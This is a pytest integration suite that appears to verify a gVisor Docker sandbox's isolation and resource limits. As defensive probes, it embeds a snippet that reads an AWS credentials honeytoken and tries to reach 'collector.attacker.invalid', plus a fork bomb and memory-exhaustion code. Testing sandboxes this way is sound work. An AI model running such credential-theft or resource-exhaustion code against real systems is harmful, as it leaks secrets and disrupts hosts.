"""VM release checks; opt in with POD_DOCKER_TESTS=1 and a capped POD_WORK_ROOT."""
import asyncio
import json
import os
import shutil
import tempfile
import threading
import time
from pathlib import Path
from types import SimpleNamespace

import docker
import pytest
from pod.sandbox import DockerSandboxRunner, SandboxLimits, SandboxSpec
from sandbox_pid_evidence import pid_cap_proven

pytestmark = [
    pytest.mark.docker,
    pytest.mark.skipif(os.environ.get("POD_DOCKER_TESTS") != "1", reason="opt-in Linux VM Docker integration"),
]


class InspectingContainers:
    def __init__(self, containers):
        self.delegate = containers
        self.created = []

    def create(self, *args, **kwargs):
        container = self.delegate.create(*args, **kwargs)
        container.reload()
        self.created.append(container.attrs["HostConfig"]["Runtime"])
        return container

    def __getattr__(self, name):
        return getattr(self.delegate, name)


class CgroupObservingContainers(InspectingContainers):
    """Observe cgroup v2 counters while the runner controls the container lifecycle."""

    def __init__(self, containers):
        super().__init__(containers)
        self.observations = []
        self.threads = []
        self.stop = threading.Event()

    def create(self, *args, **kwargs):
        container = super().create(*args, **kwargs)
        data = {"id": container.id, "samples": [], "config": {}}
        host = container.attrs["HostConfig"]
        config = container.attrs["Config"]
        data["config"] = {"runtime": host["Runtime"], "user": config["User"],
                          "pids_limit": host["PidsLimit"], "network": host["NetworkMode"],
                          "read_only": host["ReadonlyRootfs"], "cap_drop": host["CapDrop"],
                          "security_opt": host["SecurityOpt"], "memory": host["Memory"],
                          "memory_swap": host["MemorySwap"], "nano_cpus": host["NanoCpus"],
                          "ulimits": host["Ulimits"],
                          "mounts": [{k: m[k] for k in ('Destination', 'Type', 'RW')} for m in container.attrs["Mounts"]],
                          "tmpfs": host['Tmpfs'],
                          "env_names": sorted(e.partition("=")[0] for e in config["Env"])}
        self.observations.append(data)
        path = Path('/sys/fs/cgroup/system.slice') / f'docker-{container.id}.scope'

        def observe():
            previous = None
            while not self.stop.is_set():
                try:
                    sample = {name: (path / name).read_text().strip()
                              for name in ('pids.max', 'pids.current', 'pids.events')}
                    if sample != previous:
                        data['samples'].append(sample)
                        previous = sample
                except OSError:
                    pass
                time.sleep(0.002)

        thread = threading.Thread(target=observe, daemon=True)
        thread.start()
        self.threads.append(thread)
        return container

    def finish(self):
        self.stop.set()
        for thread in self.threads:
            thread.join(timeout=2)


def test_pids_diagnostic():
    """On gVisor, host cgroup rejection may terminate the sentry rather than guest EAGAIN."""
    client = docker.from_env()
    uid, gid = os.getuid(), os.getgid()
    assert uid > 0 and gid > 0
    root = Path(os.environ.get("POD_WORK_ROOT", "/srv/pod/work"))
    workspace = Path(tempfile.mkdtemp(prefix="pod-pids-probe-", dir=root))
    containers = CgroupObservingContainers(client.containers)
    config = SimpleNamespace(work_root=workspace, sandbox_image="pod-sandbox:latest", runtime="runsc",
                             sandbox_concurrency=1, require_capped_workroot=True,
                             sandbox_uid=uid, sandbox_gid=gid)
    runner = DockerSandboxRunner(config, SimpleNamespace(containers=containers))
    code = ("import errno,os,time\ntime.sleep(2)\nfor _ in range(200):\n"
            " try:\n  if os.fork() == 0: time.sleep(15); os._exit(0)\n"
            " except OSError as e:\n  if e.errno == errno.EAGAIN:\n"
            "   print('PID_LIMIT EAGAIN', flush=True); raise SystemExit(42)\n  raise\n")
    try:
        result = asyncio.run(runner.run(SandboxSpec(purpose="integration-pids", command=["python", "/work/snippet.py"],
                             files={"snippet.py": code}, limits=SandboxLimits(timeout_s=20))))
        containers.finish()
        samples = containers.observations[0]['samples']
        print('PID_DIAGNOSTIC ' + json.dumps({'result': {'outcome': result.outcome, 'exit_code': result.exit_code,
              'stdout_tail': result.stdout_tail, 'cleanup_error': result.cleanup_error,
              'destroyed_at': str(result.destroyed_at)}, 'observations': containers.observations}, sort_keys=True))
        assert not client.containers.list(all=True, filters={"label": "pod.sandbox=1"})
        assert not list(workspace.iterdir()) and result.destroyed_at and not result.cleanup_error
        actual = containers.observations[0]['config']
        assert actual['runtime'] == 'runsc' and actual['user'] == f'{uid}:{gid}'
        assert actual['network'] == 'none' and actual['read_only'] and actual['cap_drop'] == ['ALL']
        assert 'no-new-privileges' in actual['security_opt']
        assert actual['memory'] == actual['memory_swap'] == 512 * 1024 * 1024
        assert actual['nano_cpus'] == 1_000_000_000 and actual['pids_limit'] == 128
        assert {m['Destination'] for m in actual['mounts']} == {'/work', '/telemetry'}
        assert all(m['Type'] == 'bind' and m['RW'] for m in actual['mounts'])
        assert set(actual['tmpfs']) == {'/tmp'} and 'size=64m' in actual['tmpfs']['/tmp']
        assert set(actual['env_names']) == {'GPG_KEY', 'HOME', 'LANG', 'PATH', 'PYTHONDONTWRITEBYTECODE',
                                             'PYTHONUNBUFFERED', 'PYTHON_SHA256', 'PYTHON_VERSION'}
        assert {u['Name']: (u['Soft'], u['Hard']) for u in actual['ulimits']} == {
            'fsize': (52428800, 52428800), 'nofile': (256, 256)}
        assert pid_cap_proven(samples, result.outcome, result.exit_code, result.stdout_tail)
        followup = asyncio.run(runner.run(SandboxSpec(purpose="integration-followup", command=["python", "-c", "print('ok')"])))
        print('FOLLOWUP ' + json.dumps({'outcome': followup.outcome, 'destroyed_at': str(followup.destroyed_at),
                                       'cleanup_error': followup.cleanup_error}))
        assert followup.outcome == 'passed' and followup.destroyed_at and not followup.cleanup_error
        assert not client.containers.list(all=True, filters={"label": "pod.sandbox=1"})
        assert not list(workspace.iterdir())
    finally:
        containers.finish()
        shutil.rmtree(workspace)


def test_image_and_isolation():
    client = docker.from_env()
    client.ping()
    uid, gid = os.getuid(), os.getgid()
    if uid == 0 or gid == 0:
        pytest.fail("integration tests must run as a non-root service user")
    image, _ = client.images.build(path=str(Path(__file__).resolve().parents[2] / "sandbox"),
                                   tag="pod-sandbox:test",
                                   buildargs={"RUNNER_UID": str(uid), "RUNNER_GID": str(gid)})
    # Reachability is an explicit prerequisite, not silently interpreted as isolation.
    connect = "import socket; s=socket.create_connection(('1.1.1.1',443),timeout=5); s.close(); print('connected')"
    control = client.containers.run(image.tags[0], ["python", "-c", connect], runtime="runc",
                                    network_mode="bridge", remove=True)
    assert b"connected" in control, "positive-control egress must be reachable"

    root = Path(os.environ.get("POD_WORK_ROOT", "/srv/pod/work"))
    root.mkdir(parents=True, exist_ok=True)
    workspace = Path(tempfile.mkdtemp(prefix="pod-integration-", dir=root))
    containers = CgroupObservingContainers(client.containers)
    config = SimpleNamespace(work_root=workspace, sandbox_image=image.tags[0], runtime="runsc",
                             sandbox_concurrency=2, require_capped_workroot=True,
                             sandbox_uid=uid, sandbox_gid=gid)
    runner = DockerSandboxRunner(config, SimpleNamespace(containers=containers))

    def execute(code, seconds=20):
        result = asyncio.run(runner.run(SandboxSpec(purpose="integration", command=["python", "/work/snippet.py"],
                             files={"snippet.py": code}, limits=SandboxLimits(timeout_s=seconds))))
        assert containers.created[-1] == "runsc"
        assert not client.containers.list(all=True, filters={"label": "pod.sandbox=1"})
        assert not list(workspace.iterdir()), "workspace remains after sandbox execution"
        assert result.destroyed_at is not None and not result.cleanup_error
        return result

    try:
        assert execute("print(1)").outcome == "passed"
        # Workspace teardown must repair nested permissions without root privileges.
        locked = execute("import os\nos.makedirs('/work/a/b')\nopen('/work/a/b/file', 'w').write('x')\nos.chmod('/work/a/b/file', 0)\nos.chmod('/work/a/b', 0)\nos.chmod('/work/a', 0)")
        assert locked.outcome == "passed"
        assert execute("print('after cleanup')").outcome == "passed"
        exfil = execute("import socket\nprint(open('/home/runner/.aws/credentials').read())\ntry: socket.create_connection(('collector.attacker.invalid', 443), timeout=3)\nexcept OSError: print('blocked')")
        assert exfil.outcome == "passed"
        assert "honeytoken_read" in {e.type for e in exfil.telemetry}
        assert {e.type for e in exfil.telemetry} & {"dns_lookup", "net_connect"}
        assert "blocked" in exfil.stdout_tail
        network = execute("import socket\ntry:\n socket.create_connection(('1.1.1.1',443),timeout=5)\n print('unexpected success')\nexcept OSError:\n print('connect blocked')")
        assert network.outcome == "passed" and "connect blocked" in network.stdout_tail
        assert "unexpected success" not in network.stdout_tail
        assert execute("while True: pass", 2).outcome == "timeout_killed"
        memory = execute("x=[]\ntry:\n while True: x.append(bytearray(1024*1024))\nexcept MemoryError:\n print('MEMORY_LIMIT',flush=True)\n raise SystemExit(42)", 30)
        assert memory.outcome == "oom_killed" or (memory.outcome == "error" and "MEMORY_LIMIT" in memory.stdout_tail)
        fork = execute("import errno,os,time\ntime.sleep(2)\nfor _ in range(200):\n try:\n  if os.fork() == 0: time.sleep(15); os._exit(0)\n except OSError as e:\n  if e.errno == errno.EAGAIN:\n   print('PID_LIMIT EAGAIN', flush=True); raise SystemExit(42)\n  raise", 20)
        samples = containers.observations[-1]['samples']
        print('SUITE_FORK ' + json.dumps({'outcome': fork.outcome, 'exit_code': fork.exit_code,
              'stdout_tail': fork.stdout_tail, 'destroyed_at': str(fork.destroyed_at),
              'cleanup_error': fork.cleanup_error, 'samples': samples}, sort_keys=True))
        assert pid_cap_proven(samples, fork.outcome, fork.exit_code, fork.stdout_tail)
    finally:
        containers.finish()
        shutil.rmtree(workspace)
